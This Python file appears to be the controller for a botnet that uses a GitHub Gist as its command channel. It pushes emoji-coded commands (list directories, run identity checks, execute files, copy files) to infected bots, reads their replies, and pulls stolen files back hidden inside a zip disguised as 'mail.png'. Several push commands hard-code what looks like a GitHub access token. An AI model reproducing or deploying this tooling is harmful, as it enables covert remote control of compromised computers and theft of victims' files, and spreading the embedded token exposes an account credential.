
import os
import time




class CC:

    @staticmethod
    def write_w(git_dir):
        print(" ... will send 'ls' command")
        open(git_dir + "/activities.txt", "w").close()  # erase contents
        f = open(git_dir + "/activities.txt", "a")
        f.writelines("w")
        f.close()
        os.system("git push https://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@gist.github.com/b986ad8f94834deaf526315971868580.git &> /dev/null")

    @staticmethod
    def git_push_commands():
        os.system("cd b986ad8f94834deaf526315971868580;git add activities.txt")
        time.sleep(1)
        os.system("cd b986ad8f94834deaf526315971868580;git commit -m '...'")
        time.sleep(1)
        os.system("cd b986ad8f94834deaf526315971868580;git push https://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@gist.github.com/b986ad8f94834deaf526315971868580.git")
        time.sleep(1)

    @staticmethod
    def git_push_responses():
        os.system("cd b986ad8f94834deaf526315971868580;git add history.txt")
        time.sleep(1)
        os.system("cd b986ad8f94834deaf526315971868580;git commit -m 'rmresp'")
        time.sleep(1)
        os.system("cd b986ad8f94834deaf526315971868580;git push https://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@gist.github.com/b986ad8f94834deaf526315971868580.git")
        time.sleep(1)

    @staticmethod
    def git_wait_for_response(bot_name,cmd):
        e2c = {"🐎": "w", "😈": "ls", "😎": "exe", "😴": "id", "🐱‍🐉": "cp", "☠": "cp"}
        c2e = {"w":"🐎", "ls":"😈", "exe":"😎", "id":"😴", "cp":"🐱‍🐉", "rmresp":"☠"}

        if bot_name not in CC.get_up_bots():
            print("\n"+ bot_name +" is down\n")
            return

        os.system("cd b986ad8f94834deaf526315971868580; git pull")
        files = os.popen("ls b986ad8f94834deaf526315971868580").readlines()
        time.sleep(1)
        resp = ""
        if "history.txt\n" in files:
            with open("b986ad8f94834deaf526315971868580/history.txt", "r") as f:
                lines = f.readlines()
            ##  search the responnse  ##
            for line in lines:
                if bot_name in line and c2e[cmd] in line:
                    resp = line
            ##  dont, delete the responnse, could cause merge conflicts  ##
            if resp != "":
                print("\n"+ bot_name +" responded with:  "+resp+"\n")
                return
            else:
                print("\n"+ bot_name +" response not found, retry in 10 seconds..."+resp+"\n")
                time.sleep(10)
                CC.git_wait_for_response(bot_name,cmd)

    @staticmethod
    def git_delete_cmd_after_resp(bot, cmd):
        files = os.popen("ls b986ad8f94834deaf526315971868580").readlines()
        if "activities.txt\n" in files:
            with open("b986ad8f94834deaf526315971868580/activities.txt", "r") as f:
                lines = f.readlines()
                print(lines)
            with open("b986ad8f94834deaf526315971868580/activities.txt", "w") as f:
                for line in lines:
                    if bot not in line and cmd not in line:
                        f.write(line)
        f.close()
        CC.git_push_commands()


    @staticmethod
    def get_up_bots():
        bots = []
        os.system("cd b986ad8f94834deaf526315971868580; git pull")
        time.sleep(1)
        files = os.popen("ls b986ad8f94834deaf526315971868580").readlines()
        if "scores.txt\n" in files:
            f = open("b986ad8f94834deaf526315971868580/scores.txt", "r")
            print("\n-------  UP BOTS:       \n")
            for line in f.readlines():
                print(line.split(" ")[0])
                bots.append(line.split(" ")[0])
            f.close()
        return bots

    @staticmethod
    def git_push_mail():
            os.system("cd b986ad8f94834deaf526315971868580;git add mail.png")
            time.sleep(1)
            os.system("cd b986ad8f94834deaf526315971868580;git commit -m 'mail.png'")
            time.sleep(1)
            os.system(
                "cd b986ad8f94834deaf526315971868580;git push https://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@gist.github.com/b986ad8f94834deaf526315971868580.git")
            time.sleep(1)





def main(git_dir, token, url):

    os.system("git clone "+url+" &> /dev/null")
    time.sleep(1)
    bots = []
    commands = ["w", "ls", "exe", "id", "cp", "rmresp"]
    c2e = {"w":"🐎", "ls":"😈", "exe":"😎", "id":"😴", "cp":"🐱‍🐉", "rmresp":"☠"}


    ####   ARE THERE ANY UP-BOTS???  ####
    while 1:
        bots = CC.get_up_bots()
        if len(bots) == 0:
            print("\n -- bots are off, will try again in 10 sec")
            time.sleep(10)
        else:
            break

    ####   SEND COMMAND TO A BOT <bot>:<cmd>  ####
    print(bots)
    while 1:
        i = input("\n'<bot>:<cmd>': \n")
        print("\n\n -------- WAIT FOR 'DONE!' SIGNAL -------- ")

        ####   argument check  ####
        bot = i.split(":")[0]
        cmd = i.split(":")[1]
        bots = CC.get_up_bots()
        if bot not in bots and cmd != "rmresp":
            print("\n   THIS BOT is DOWN!    \n")
            continue
        if cmd not in commands:
            print("\n   THIS CMD is INVALID!   \n")
            continue

        if cmd == "w":
            print(" ... 'w' command")
            open(git_dir + "/activities.txt", "w").close()  # erase contents
            f = open(git_dir + "/activities.txt", "a")
            f.writelines(bot+":"+c2e[cmd])
            f.close()
            CC.git_push_commands()
            CC.git_wait_for_response(bot,cmd)
            CC.git_delete_cmd_after_resp(bot, cmd)

        if cmd == "ls":
            path = i.split(":")[2]
            print(" ... 'ls' command, path= "+path)
            open(git_dir + "/activities.txt", "w").close()  # erase contents
            f = open(git_dir + "/activities.txt", "a")
            f.writelines(bot+":"+c2e[cmd]+":"+path)
            f.close()
            CC.git_push_commands()
            CC.git_wait_for_response(bot, cmd)
            CC.git_delete_cmd_after_resp(bot, cmd)

        if cmd == "id":
            print(" ... 'id' command")
            open(git_dir + "/activities.txt", "w").close()  # erase contents
            f = open(git_dir + "/activities.txt", "a")
            f.writelines(bot+":"+c2e[cmd])
            f.close()
            CC.git_push_commands()
            CC.git_wait_for_response(bot,cmd)
            CC.git_delete_cmd_after_resp(bot, cmd)

        if cmd == "rmresp":
            print("\n    will remove all response entries for " + bot + "\n")
            files = os.popen("ls b986ad8f94834deaf526315971868580").readlines()
            if "history.txt\n" in files:
                with open("b986ad8f94834deaf526315971868580/history.txt", "r") as f:
                    lines = f.readlines()
                with open("b986ad8f94834deaf526315971868580/history.txt", "w") as f:
                    for line in lines:
                        if bot not in line:
                            f.write(line)
            CC.git_push_responses()



        if cmd == "cp":
            path = i.split(":")[2]
            print(" ... 'cp' command")

            ## send mail.png as envelope
            print("\n\n   copying envelope   \n\n")
            os.system("cp mail-orig.png b986ad8f94834deaf526315971868580/mail.png")
            CC.git_push_mail()
            time.sleep(1)

            ## command copy request
            print("\n\n          commanding request to bot   \n\n")
            open(git_dir + "/activities.txt", "w").close()  # erase contents
            f = open(git_dir + "/activities.txt", "a")
            f.writelines(bot+":"+c2e[cmd]+":"+path)
            f.close()
            print("\n\n          push cmd, wait, del cmd   \n\n")
            CC.git_push_commands()
            CC.git_wait_for_response(bot, cmd)
            CC.git_delete_cmd_after_resp(bot, cmd)

            ## pull written envelope
            print("\n\n          pulling written envelope   \n\n")
            os.system("cd b986ad8f94834deaf526315971868580; git pull")
            time.sleep(2)
            print("\n\n          envelope unzip   \n\n")
            os.system("unzip b986ad8f94834deaf526315971868580/mail.png")
            time.sleep(1)
            file = path.split("/")[-1]
            os.system("mv b986ad8f94834deaf526315971868580/" + file + " botcpy-"+file)
            os.system("rm b986ad8f94834deaf526315971868580/" + file)
            print("  "+file + " copied!")
            # time.sleep(30)



        if cmd == "exe":
            path = i.split(":")[2]
            print(" ... 'exe' command, path= " + path)
            open(git_dir + "/activities.txt", "w").close()  # erase contents
            f = open(git_dir + "/activities.txt", "a")
            f.writelines(bot + ":" + c2e[cmd] + ":" + path)
            f.close()
            CC.git_push_commands()
            CC.git_wait_for_response(bot, cmd)
            CC.git_delete_cmd_after_resp(bot, cmd)

        print("\n --------- DONE! --------- \n\n")


if __name__ == '__main__':
    token = ""
    main("b986ad8f94834deaf526315971868580",token, "https://gist.github.com/b986ad8f94834deaf526315971868580.git")